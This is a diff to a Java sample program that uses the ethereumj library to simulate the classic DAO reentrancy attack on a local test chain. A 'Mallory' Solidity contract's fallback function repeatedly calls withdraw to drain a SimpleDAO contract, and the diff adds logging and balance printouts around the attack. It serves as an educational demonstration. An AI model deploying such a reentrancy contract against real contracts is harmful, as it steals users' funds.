@@ -17,9 +17,11 @@
  */
 package org.ethereum.samples;
 
+import org.ethereum.core.BlockSummary;
 import org.ethereum.core.Transaction;
 import org.ethereum.crypto.ECKey;
 import org.ethereum.crypto.HashUtil;
+import org.ethereum.listener.EthereumListenerAdapter;
 import org.ethereum.util.ByteUtil;
 import org.ethereum.util.blockchain.SolidityCallResult;
 import org.ethereum.util.blockchain.SolidityContract;
@@ -67,6 +69,7 @@ public class SimpleDaoSample {
 
     private static final String malloryContractSrc =
             "contract Mallory {" +
+            "    event LogCall(uint x);" +
             "    SimpleDAO public dao;" +
             "    address owner;" +
             "    constructor(SimpleDAO _dao) public {" +
@@ -74,6 +77,7 @@ public class SimpleDaoSample {
             "        owner = msg.sender; " +
             "    }" +
             "    function() payable { " +
+            "        LogCall(this.balance);" +
             "        dao.withdraw(dao.queryCredit(this)); " +
             "    }" +
             "    function getJackpot() { " +
@@ -102,11 +106,21 @@ public class SimpleDaoSample {
         // the initial miner dataset is generated
         bc.createBlock();
 
+        bc.addEthereumListener(new EthereumListenerAdapter() {
+            @Override
+            public void onBlock(BlockSummary blockSummary, boolean best) {
+                blockSummary.getReceipts().forEach(receipt -> receipt.getLogInfoList().
+                        forEach(logInfo -> {
+                            System.out.println("LogInfo: " + logInfo);
+                        }));
+            }
+        });
+
         System.out.println("Creating accounts: ownder, user1, user2, user3");
 
         //@@ account{balance:10ether} owner;
         Account owner = new Account("account owner");
-        bc.sendEther(owner.getEckey().getAddress(), new BigInteger("250000000000000000"));
+        bc.sendEther(owner.getEckey().getAddress(), new BigInteger("500000000000000000"));
 
 
         //@@ account{balance:50ether} user1, user2, user3;
@@ -118,6 +132,9 @@ public class SimpleDaoSample {
 
         Account user3 = new Account("account user3");
         bc.sendEther(user3.getEckey().getAddress(), new BigInteger("500000000000000000"));
+
+        Account hacker = new Account("account hacker");
+        bc.sendEther(hacker.getEckey().getAddress(), new BigInteger("500000000000000000"));
 
         //@@ account{smart contract : dao.sol, by: owner, balance: 0eth} dao;
 //        Account dao = new Account("account dao");
@@ -132,26 +149,49 @@ public class SimpleDaoSample {
         bc.setSender(owner.getEckey());
         SolidityContract  daoContract = bc.submitNewContract(contractSrc, "SimpleDAO");
 
+        System.out.println("User1, user2, and user3 donate 1ether, 5ether, and 10ethere to the dao.");
+
         //@@ sendTransaction(dao, donate, user1, {from:user1, gas:3000000, value:1ether});
 
         bc.setSender(user1.getEckey());
-        daoContract.callFunction("donate", 1);
+        SolidityCallResult result_donate1 = daoContract.callFunction("donate", 1);
+        System.out.println(result_donate1);
+
 
         //@@ sendTransaction(dao, donate, user2, {from:user2, gas:3000000, value:5ether});
 
         bc.setSender(user2.getEckey());
-        daoContract.callFunction("donate", 5);
+        SolidityCallResult result_donate2 = daoContract.callFunction("donate", 5);
+        System.out.println(result_donate2);
 
         //@@ sendTransaction(dao, donate, user3, {account:user2, gaslimit:3000000, value:10ether});
 
         bc.setSender(user3.getEckey());
-        daoContract.callFunction("donate", 10);
+        SolidityCallResult result_donate3 = daoContract.callFunction("donate", 10);
+        System.out.println(result_donate3);
+
+        BigInteger user1_bi = bc.getBlockchain().getRepository().getBalance(user1.getEckey().getAddress());
+        BigInteger user2_bi = bc.getBlockchain().getRepository().getBalance(user2.getEckey().getAddress());
+        BigInteger user3_bi = bc.getBlockchain().getRepository().getBalance(user3.getEckey().getAddress());
+
+        System.out.println("user1 balance: " + user1_bi);
+        System.out.println("user2 balance: " + user2_bi);
+        System.out.println("user3 balance: " + user3_bi);
 
         System.out.println("Creating accounts: hacker");
 
         //@@ account{balance: 1ether} hacker;
-        Account hacker = new Account("accout hacker");
-        bc.sendEther(hacker.getEckey().getAddress(), new BigInteger("500000000000000000"));
+//        Account hacker = new Account("account hacker");
+//        bc.sendEther(hacker.getEckey().getAddress(), new BigInteger("250000000000000000"));
+
+        System.out.println("The hacker donates 1ether to the dao.");
+
+        bc.setSender(hacker.getEckey());
+        SolidityCallResult result_donate_hacker = daoContract.callFunction("donate", 1);
+        System.out.println(result_donate_hacker);
+
+        BigInteger hacker_bi = bc.getBlockchain().getRepository().getBalance(hacker.getEckey().getAddress());
+        System.out.println("hacker balance: " + hacker_bi);
 
         System.out.println("Creating a contract: Mallory");
 
@@ -163,32 +203,33 @@ public class SimpleDaoSample {
 
         //@@ sendTransaction(dao, donate, mallory, {from:hacker, gas:3000000, value:1ether});
 
-        System.out.println("The hacker donates 1ether to the dao.");
-
-        bc.setSender(hacker.getEckey());
-        daoContract.callFunction("donate", 1);
-
         System.out.println("The hacker calls the fallback function of the mallory contract.");
 
         //@@ sendTransaction(mallory, fallback, {from:hacker, gas:300000000, value:0ether});
         bc.setSender(hacker.getEckey());
-        malloryContract.callFunction("fallback");
+        SolidityCallResult result_fallback = malloryContract.callFunction("");
+        System.out.println(result_fallback);
 
         System.out.println("The fallback function of the mallory contract does the job.");
 
-        while(true) {
-            BigInteger bi = bc.getBlockchain().getRepository().getBalance(malloryContract.getAddress());
-            long delta = 5; // 12 = 17 -delta = 12 - 5
-            if (bi.compareTo(new BigInteger("12")) == 1) {
-                break;
-            }
-        }
+//        while(true) {
+//            BigInteger bi = bc.getBlockchain().getRepository().getBalance(malloryContract.getAddress());
+//            long delta = 5; // 12 = 17 -delta = 12 - 5
+//            if (bi.compareTo(new BigInteger("12")) == 1) {
+//                break;
+//            }
+//            else {
+////                System.out.print("==> " + bi);
+//            }
+//        }
+        System.out.println();
 
         System.out.println("The hacker calls the getJackpot function of the mallory contract.");
 
         //@@ sendTransaction(mallory, getJackpot, {from:hacker, gas:300000, value:0ether});
         bc.setSender(hacker.getEckey());
-        malloryContract.callFunction("getJackpot");
+        SolidityCallResult result_getJackpot = malloryContract.callFunction("getJackpot");
+        System.out.println(result_getJackpot);
 
         //@@ assert hacker.balance <= 1ether;
         BigInteger bi = bc.getBlockchain().getRepository().getBalance(hacker.getEckey().getAddress());
